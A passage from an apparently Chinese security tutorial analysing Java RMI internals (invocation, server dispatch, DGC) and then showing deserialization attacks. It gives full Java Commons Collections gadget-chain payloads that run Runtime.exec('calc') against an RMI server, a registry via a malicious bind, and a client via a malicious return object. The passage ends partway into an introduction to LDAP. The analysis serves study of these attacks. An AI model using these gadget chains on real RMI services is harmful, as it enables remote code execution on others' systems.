<p>继续跟进<code>invokeRemoteMethod</code>方法，前面判断代理是否实现<code>Remote</code>远程类，再判断<code>Method</code>的归属类是否是<code>Remote</code>的子类，不满足的话会抛出异常，满足会进入<code>UnicastRef.invoke</code>方法</p>
<p><img src="/posts/ad3be040/r-86.png" title="invokeRemoteMethod"></p>
<p>跟进<code>UnicastRef.invoke</code>方法，先是创建<code>liveref</code>的连接<code>connection</code></p>
<p><img src="/posts/ad3be040/r-87.png" title="连接创建"></p>
<p>再创建连接<code>connection</code>的远程连接流<code>call</code></p>
<p><img src="/posts/ad3be040/r-88.png" title="call创建"></p>
<p>接下来对参数列表进行判断后序列化写入</p>
<p><img src="/posts/ad3be040/r-89.png" title="参数序列化写入"><br><img src="/posts/ad3be040/r-90.png" title="参数序列化写入"></p>
<p>上面完成后，对<code>call</code>流进行执行操作</p>
<p><img src="/posts/ad3be040/r-91.png" title="executeCall"></p>
<p>其中<code>releaseOutputStream</code>方法是向对服务器远程调用序列化传输数据</p>
<p><img src="/posts/ad3be040/r-92.png" title="releaseOutputStream"></p>
<p>跟进，<code>out</code>为写入流且存在，因此会调用<code>flush()</code>方法</p>
<p><img src="/posts/ad3be040/r-93.png" title="flush"></p>
<p>跟进<code>flush</code>方法，会再次调用<code>flush</code>方法</p>
<p><img src="/posts/ad3be040/r-94.png" title="flush"></p>
<p>其中<code>drain</code>方法由于<code>pos</code>为0，因此会直接返回</p>
<p><img src="/posts/ad3be040/r-95.png" title="drain"><br><img src="/posts/ad3be040/r-96.png" title="drain"></p>
<p>进入到<code>BufferedOutputStream.flush()</code>方法中</p>
<p><img src="/posts/ad3be040/r-97.png" title="BufferedOutputStream.flush()"><br><img src="/posts/ad3be040/r-98.png" title="BufferedOutputStream.flush()"></p>
<p>继续跟进<code>flushBuffer()</code>方法，在该方法中，对数据进行序列化写入</p>
<p><img src="/posts/ad3be040/r-99.png" title="write"></p>
<p>同时，服务器端进行反序列化解析数据读取客户端传过来的数据，并执行方法</p>
<p><img src="/posts/ad3be040/r-100.png" title="服务器端执行方法"></p>
<p>执行后，客户端对写入流进行释放，写入执行过程就差不多结束</p>
<p>由于调用方法的返回类型为<code>String</code>返回的字符串，因此会进行反序列化读取返回来的字符串的操作</p>
<p><img src="/posts/ad3be040/r-101.png" title="反序列化读取"></p>
<p>获取<code>call</code>的读取流，然后通过<code>unmarshalValue</code>方法根据返回类型进行反序列化读取数据（这里会涉及到服务器返回恶意序列化数据然后客户端本地反序列化读取导致被攻击）</p>
<p><img src="/posts/ad3be040/r-102.png" title="unmarshalValue"><br><img src="/posts/ad3be040/r-103.png" title="unmarshalValue"></p>
<p>反序列化获取数据后，最后释放掉连接，然后返回获取的字符串</p>
<p><img src="/posts/ad3be040/r-104.png" title="unmarshalValue"></p>
<p>至此主要执行过程结束</p>
<h3 id="7、服务端处理客户端远程调用"><a href="#7、服务端处理客户端远程调用" class="headerlink" title="7、服务端处理客户端远程调用"></a>7、服务端处理客户端远程调用</h3><p>这里的起始分析位置跟步骤四相同，都是通过开启监听后，创建线程连接调用的<code>TCPTransport.run</code>方法引入的，直接通过（方法调用情况：<code>TCPTransport.run-&gt;run0-&gt;handleMessages-&gt;serviceCall-&gt;disp.dispatch-&gt;UnicastServerRef.dispatch</code>）到重点部分</p>
<p>步骤4中提到<code>skel</code>是否为<code>null</code>是判断是服务端处理还是注册器端处理，注册器端处理过后返回给客户端后，客户端直接跟服务端进行通信，序列化数据传输过来后，服务端开始处理，此时服务端并没有<code>skel</code>，因此会跳过该判断</p>
<p><img src="/posts/ad3be040/r-120.png" title="dispatch"></p>
<p>然后从读取流中读取方法名</p>
<p><img src="/posts/ad3be040/r-121.png" title="method"></p>
<p>获取到方法名后，通过<code>unmarshalParameters</code>方法将参数进行反序列化读取出来，前面分析过该方法了，就不分析了</p>
<p><img src="/posts/ad3be040/r-123.png" title="反序列化参数"><br><img src="/posts/ad3be040/r-122.png" title="反序列化参数"></p>
<p>读取过后，释放掉读取流，然后通过反射执行方法，得到方法的返回值</p>
<p><img src="/posts/ad3be040/r-124.png" title="反射执行方法"><br><img src="/posts/ad3be040/r-125.png" title="反射执行方法"></p>
<p>最后再将返回值通过<code>marshalValue</code>方法序列化写入传递给客户端</p>
<p><img src="/posts/ad3be040/r-126.png" title="序列化写入"><br><img src="/posts/ad3be040/r-127.png" title="序列化写入"></p>
<p>写入完，释放掉读取流、输入流，就完成了服务端对客户端数据的处理过程</p>
<h3 id="8、DGC创建"><a href="#8、DGC创建" class="headerlink" title="8、DGC创建"></a>8、DGC创建</h3><p>DGC全名（Distributed Garbage Collection），是一种分布式垃圾回收机制，用来回收不用的远程对象，注册中心的创建过程中会创建DGC</p>
<p>跟进GDC创建，前面的分析在创建注册中心分析过了，直接到创建的关键步骤（<code>putTarget</code>）</p>
<p>前文提到在创建过程会创建注册中心<code>stub、skel</code>等信息最终放到<code>target</code>里面，最后将<code>target</code>放到<code>objtable</code>里</p>
<p>在最后一步<code>putTarget</code>中，会调用<code>DGCImpl</code></p>
<p><img src="/posts/ad3be040/r-131.png" title="DGCImpl创建"></p>
<p>DGC调用了一个静态方法<code>dgcLog</code>，在调用静态方法的时候会通过调用静态函数进行实例化DGC对象</p>
<p><img src="/posts/ad3be040/r-132.png" title="DGCImpl创建"></p>
<p>DGC的静态方法中完成了对DGC的<code>disp、stub、skel</code>的创建，创建过程和注册中心的创建类似，不再重复分析，创建完后最后放进<code>objtable</code>表中</p>
<p><img src="/posts/ad3be040/r-133.png" title="DGCImpl创建"><br><img src="/posts/ad3be040/r-134.png" title="DGCImpl创建"></p>
<p>同注册中心一样，<code>DGCImpl</code>也存在自己的<code>stub</code>和<code>skel</code>，执行位置也很相似，<code>skel</code>监听线程中通过<code>dispatch</code>方法执行分支<br><code>DGCImpl_Stub</code>主要实现两个功能：<code>clean</code>、<code>dirty</code></p>
<p><code>clean</code>的作用是清除回收远程连接对象，创建<code>call</code>连接流，将<code>ObjId</code>、<code>长度</code>等序列化写入，然后调用<code>invoke</code>方法</p>
<p><img src="/posts/ad3be040/r-135.png" title="clean"></p>
<p>在调用<code>invoke</code>方法时，在客户端调用注册中心的时候说过会最后执行<code>executeCall</code>方法对数据进行反序列化读取</p>
<p><img src="/posts/ad3be040/r-80.png" title="executeCall"></p>
<p><code>dirty</code>方法的作用是客户端调用服务器远程引用时，使用<code>dirty</code>来注册一个临时的远程引用，后续还想使用该远程引用，就再次使用<code>dirty</code>方法去续租<br>同样该方法也会调用<code>invoke</code>反序列化读取信息</p>
<p><img src="/posts/ad3be040/r-136.png" title="dirty"></p>
<p>然后DGC服务端的主要方法<code>dispatch</code>，可以看到和注册中心的执行模式非常相似</p>
<p>也主要有两个分支分别针对<code>clean</code>和<code>dirty</code></p>
<p><img src="/posts/ad3be040/r-137.png" title="dispatch"><br><img src="/posts/ad3be040/r-138.png" title="dispatch"></p>
<p>针对不同的方法调用都显示反序列化获取<code>stub</code>客户端先写入的信息<code>ObjId</code>、<code>租赁信息</code>等，最后再通过<code>DGCImpl</code>的<code>clean/dirty</code>方法对远程引用进行清除和租赁。</p>
<p>由于<code>Skel/stub</code>都存在反序列化点，因此针对该DGC的攻击被称为JRMP攻击。</p>
<h2 id="四、流程总结"><a href="#四、流程总结" class="headerlink" title="四、流程总结"></a>四、流程总结</h2><p>直接引用java安全rmi文章总结，写的很清晰了</p>
<p>RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下：</p>
<ol>
<li><p>RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)。</p>
</li>
<li><p>Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象。</p>
</li>
<li><p>RemoteCall序列化RMI服务名称、Remote对象。</p>
</li>
<li><p>RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式（传输层）传输到RMI服务端的远程引用层。</p>
</li>
<li><p>RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel.dispatch)。</p>
</li>
<li><p>Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化。</p>
</li>
<li><p>Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端。</p>
</li>
<li><p>RMI客户端反序列化服务端结果，获取远程对象的引用。</p>
</li>
<li><p>RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端</p>
</li>
<li><p>RMI客户端反序列化RMI远程方法调用结果。</p>
</li>
</ol>
<h2 id="五、RMI利用"><a href="#五、RMI利用" class="headerlink" title="五、RMI利用"></a>五、RMI利用</h2><h3 id="1、攻击服务端Server"><a href="#1、攻击服务端Server" class="headerlink" title="1、攻击服务端Server"></a>1、攻击服务端Server</h3><p>客户端通过注册中心获取到通信服务器端的stub，客户端直接向服务端进行通信，服务端通过获取客户端的参数进行反序列化结合组件触发漏洞</p>
<p>示例环境：java版本8u66，服务器使用cc3.1组件，服务端存在Object参数传入</p>
<p>RMIObject:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIObjectImpl:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">helloObj</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用obj输出：&quot;</span>+obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端调用cc1链对象传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        rc.helloObj(payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br><img src="/posts/ad3be040/r-128.png" title="攻击服务端"></p>
<h3 id="2、攻击注册中心Registry"><a href="#2、攻击注册中心Registry" class="headerlink" title="2、攻击注册中心Registry"></a>2、攻击注册中心Registry</h3><p>在底层调试分析注册中心处理客户端和服务端请求的时候提到，根据不同的分支进入对应的处理，其中客户端使用的<code>lookup</code>方法参数为字符串，因此不能通过<code>lookup</code>方法传递<code>Object</code>对象攻击注册中心，但服务端&#x2F;客户端可调用<code>bind</code>、<code>rebind</code>等方法绑定对象，将<code>Object</code>对象传入，注册中心再接收到服务端&#x2F;客户端的<code>bind</code>对象进行反序列化读取时，触发漏洞<br>服务端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        <span class="comment">//创建远程调用对象</span></span><br><span class="line">        RMIObject rmo=<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>();</span><br><span class="line">        <span class="comment">//创建注册中心绑定调用端口</span></span><br><span class="line">        Registry rg= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//Registry rg = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span></span><br><span class="line">        <span class="comment">//注册绑定调用服务</span></span><br><span class="line">        rg.bind(<span class="string">&quot;RMIObject&quot;</span>,rmo);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>客户端向注册中心绑定恶意<code>Bind</code>：<br>由于<code>bind</code>对象是需要<code>Remote</code>对象，因此调用的链最后需要将返回的对象添加一个动态代理返回给<code>Remote</code>对象即可，在cc1链上最后返回值加工一下即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//恶意bind，注册中心反序列化解析bind对象时触发漏洞</span></span><br><span class="line">        rg.bind(<span class="string">&quot;payload&quot;</span>,payload());</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">            Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">            <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">            InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">            <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">            Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">            <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">            InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line">            Remote remobj=(Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,invohandlerproxy);</span><br><span class="line">            <span class="keyword">return</span> remobj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实现效果：<br><img src="/posts/ad3be040/r-129.png" title="攻击注册中心"></p>
<h3 id="3、攻击客户端Client"><a href="#3、攻击客户端Client" class="headerlink" title="3、攻击客户端Client"></a>3、攻击客户端Client</h3><p>客户端向注册中心请求会返回<code>stub</code>时，会反序列化解析数据导致漏洞，也可以在服务端放置恶意的方法返回对象，客户端调用服务端的方法时解析放回来的数据时导致漏洞。</p>
<p>原理相同这里以服务器端放置恶意方法返回给客户端进行解析触发漏洞举例</p>
<p>服务端：<br>RMIObject:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIObject</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException,Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>RMIObjectImpl</code>放置恶意方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="comment">//UnicastRemoteObject.exportObject(this,0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;远程调用输出：&quot;</span>+hello);</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">helloObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>客户端调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">rg</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RMIObject</span> <span class="variable">rc</span> <span class="operator">=</span> (RMIObject) rg.lookup(<span class="string">&quot;RMIObject&quot;</span>);</span><br><span class="line">        <span class="comment">//调用服务端恶意方法</span></span><br><span class="line">        rc.helloObj();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>执行效果：<br><img src="/posts/ad3be040/r-130.png" title="攻击客户端"></p>
<h1 id="0x02、LDAP"><a href="#0x02、LDAP" class="headerlink" title="0x02、LDAP"></a>0x02、LDAP</h1><p><strong>LDAP描述</strong><br>引用：</p>
<blockquote>
<p>LDAP是轻量目录访问协议(LightweightDirectory Access Protocol)，是一种轻型目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。<br>目录是一个为查询、浏览和搜索而优化的数据库，是树状结构组织数据，通过TCP&#x2F;IP传输服务运行。</p>
</blockquote>
<p>LDAP作用是类似文件目录，而不是实际的数据库，功能作用比喻就是电话簿、地址簿。</p>
<p>LDAP服务常见端口：LDAP:389  LDAPS:636</p>
<p>引用<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">文章</a>中的原理图：</p>
<p><img src="/posts/ad3be040/r-186.png" title="LDAP原理图"></p>
<p>这里直接引用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wilburxu/p/9174353.html">相关概念</a>，写的很清楚了<br>以及引用概念：<br>目录树：</p>
<ol>
<li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目。</li>
<li>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称（DN）。</li>
<li>对象类：与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属性也会被继承下来。</li>
<li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</li>
</ol>
<p>DC、UID、OU、CN、SN、DN、RDN相关含义：</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>英文全称</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>dc</td>
<td>Domain Component</td>
